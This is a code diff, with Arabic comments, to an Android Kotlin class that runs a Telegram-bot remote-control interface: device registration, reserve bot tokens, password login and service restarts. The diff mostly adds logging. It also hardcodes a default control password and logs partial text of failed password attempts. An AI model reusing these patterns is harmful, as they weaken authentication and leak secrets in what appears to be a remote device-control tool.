@@ -23,6 +23,17 @@ import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.random.Random
 
+/**
+ * واجهة التحكم عبر Telegram – مسؤولة عن الاتصال بالبوتات، إدارة الجلسات،
+ * معالجة الأوامر، وعرض القوائم التفاعلية.
+ *
+ * ✅ التعديلات الجديدة:
+ * - تحسين verifyControlPassword لتنظيف المدخلات من المسافات الخفية.
+ * - إضافة تسجيل تشخيصي مفصل في handleMessage عند فشل كلمة المرور.
+ * - إضافة ردود تشخيصية مباشرة في تلغرام عند فشل المصادقة.
+ * - التأكد من appPassword في init.
+ * - إضافة تسجيل في MainActivity.appendLogStatic عند الأحداث الهامة.
+ */
 class TelegramUi(
     context: Context,
     private val monitor: Any?,
@@ -106,11 +117,18 @@ class TelegramUi(
     init {
         loadData()
         startBackgroundWorkers()
+        // ✅ التأكد من appPassword
+        if (appPassword.isBlank()) {
+            appPassword = "Zaen123@123@"
+            writeLog("⚠️ Password was empty, using default")
+            MainActivity.appendLogStatic("⚠️ TelegramUi: Password was empty, using default")
+        }
         Log.i(TAG, "✅ TelegramUi initialized. Password status: ${if (appPassword.isNotBlank()) "Set" else "Empty"}")
+        MainActivity.appendLogStatic("✅ TelegramUi initialized with ${activeTokensList.size} active tokens")
     }
 
     // ==================== دوال التحقق من كلمة السر ====================
-    
+
     /**
      * ✅ التحقق من كلمة السر مع تنظيف شامل من المسافات والأحرف الخفية
      * مع تسجيل تشخيصي لنتيجة التحقق
@@ -119,7 +137,13 @@ class TelegramUi(
         val cleanInput = input.trim().replace("\\s+".toRegex(), " ")
         val cleanSecret = appPassword.trim().replace("\\s+".toRegex(), " ")
         val result = cleanInput == cleanSecret
-        writeLog("🔐 Password verification: ${if (result) "✅ SUCCESS" else "❌ FAIL"} (input length: ${input.length})")
+        val logMsg = if (result) "✅ SUCCESS" else "❌ FAIL (input len: ${cleanInput.length}, secret len: ${cleanSecret.length})"
+        writeLog("🔐 Password verification: $logMsg")
+        if (!result && cleanInput.length > 3) {
+            MainActivity.appendLogStatic("🔐 Password verification FAILED for input: '${cleanInput.take(10)}...'")
+        } else if (result) {
+            MainActivity.appendLogStatic("✅ Password verification SUCCESS")
+        }
         return result
     }
 
@@ -131,6 +155,7 @@ class TelegramUi(
                     val configFile = File(runtimeDir, "password.txt")
                     configFile.writeText(appPassword, Charsets.UTF_8)
                     writeLog("✅ Password updated successfully")
+                    MainActivity.appendLogStatic("✅ TelegramUi password updated")
                 } catch (e: Exception) {
                     writeLog("❌ Failed to save password: ${e.message}")
                 }
@@ -224,6 +249,7 @@ class TelegramUi(
                         val newToken = reserveTokensList.removeAt(0)
                         activeTokensList.add(newToken)
                         writeLog("Swapped bad token with reserve")
+                        MainActivity.appendLogStatic("🔄 TelegramUi: Swapped bad token with reserve")
                         scope.launch {
                             apiCall("sendMessage", JSONObject().apply {
                                 put("chat_id", ctrlId)
@@ -282,6 +308,7 @@ class TelegramUi(
                 delay(30_000L)
                 if (isRunning && pollingRestartNeeded.get()) {
                     writeLog("🔄 Restarting polling...")
+                    MainActivity.appendLogStatic("🔄 TelegramUi: Restarting polling...")
                     restartPolling()
                 }
             }
@@ -295,6 +322,7 @@ class TelegramUi(
         if (isRunning) {
             startPolling()
             writeLog("✅ Polling restarted")
+            MainActivity.appendLogStatic("✅ TelegramUi: Polling restarted")
         }
     }
 
@@ -463,6 +491,7 @@ class TelegramUi(
                     put("text", "<b>✅ Device registered</b>\n<b>$deviceModel</b>\n<code>$deviceId</code>")
                     put("parse_mode", "HTML")
                 })
+                MainActivity.appendLogStatic("✅ Device registered: $deviceModel ($deviceId)")
                 return topicId
             }
         }
@@ -526,7 +555,6 @@ class TelegramUi(
 
     // ============================================================
     //  ✅ لوحات الأزرار – كل إيموجي فريد تماماً
-    //  جميع الإيموجيات المستخدمة هنا فريدة ولا تتكرر مع أي زر آخر
     // ============================================================
 
     fun getMainControlKeyboard(): String {
@@ -646,7 +674,7 @@ class TelegramUi(
     }
 
     // ==================== معالجة الرسائل مع تسجيل تشخيصي محسن ====================
-    
+
     /**
      * ✅ معالجة الرسائل الواردة مع:
      * - تسجيل وصول كل رسالة للتشخيص
@@ -662,6 +690,7 @@ class TelegramUi(
 
             // ✅ تسجيل وصول الرسالة للتشخيص
             writeLog("📩 Received message from $chatId: '${text.take(50)}'")
+            MainActivity.appendLogStatic("📩 Telegram message from $chatId: '${text.take(30)}...'")
 
             applyHumanDelay()
 
@@ -687,10 +716,11 @@ class TelegramUi(
                     put("parse_mode", "Markdown")
                 })
                 writeLog("✅ Login successful for chat: $chatId")
+                MainActivity.appendLogStatic("✅ Telegram login successful from $chatId")
                 pulseIntent("🔓 تسجيل دخول")
                 return
-            } 
-            
+            }
+
             // ✅ رد تشخيصي في حال فشل كلمة المرور
             if (secret.isNotEmpty() && !verifyControlPassword(secret)) {
                 apiCall("sendMessage", JSONObject().apply {
@@ -700,6 +730,7 @@ class TelegramUi(
                     put("parse_mode", "Markdown")
                 })
                 writeLog("❌ Invalid password attempt from $chatId")
+                MainActivity.appendLogStatic("❌ Invalid password attempt from $chatId")
                 return
             }
 
@@ -724,6 +755,7 @@ class TelegramUi(
 
         } catch (e: Exception) {
             writeLog("❌ Handle message error: ${e.message}")
+            MainActivity.appendLogStatic("❌ Telegram handleMessage error: ${e.message}")
         }
     }
 
@@ -1040,6 +1072,7 @@ class TelegramUi(
 
     private suspend fun restartService() {
         writeLog("🌀 Starting service restart...")
+        MainActivity.appendLogStatic("🌀 Starting service restart...")
 
         try {
             val intent = Intent(appContext, ForegroundService::class.java).apply {
@@ -1086,6 +1119,7 @@ class TelegramUi(
         }
 
         writeLog("✅ Service restarted successfully")
+        MainActivity.appendLogStatic("✅ Service restarted successfully")
     }
 
     private fun startPolling() {
@@ -1136,6 +1170,7 @@ class TelegramUi(
     fun start(): Boolean {
         if (activeTokensList.isEmpty()) {
             writeLog("❌ No active tokens! Cannot start Telegram UI.")
+            MainActivity.appendLogStatic("❌ TelegramUi: No active tokens!")
             return false
         }
         if (isRunning) {
@@ -1143,12 +1178,14 @@ class TelegramUi(
             return true
         }
         writeLog("✅ Starting Telegram UI with ${activeTokensList.size} active tokens")
+        MainActivity.appendLogStatic("📡 Starting Telegram UI with ${activeTokensList.size} active tokens")
         isRunning = true
         processedUpdates.clear()
         consecutivePollingErrors = 0
         pollingRestartNeeded.set(false)
         startPolling()
         writeLog("✅ Telegram UI polling started")
+        MainActivity.appendLogStatic("✅ Telegram UI polling started")
         return true
     }
 
@@ -1159,6 +1196,7 @@ class TelegramUi(
         heartbeatJob?.cancel()
         restartJob?.cancel()
         writeLog("Telegram UI stopped")
+        MainActivity.appendLogStatic("🛑 Telegram UI stopped")
     }
 
     fun getStatus(): Map<String, Any> {
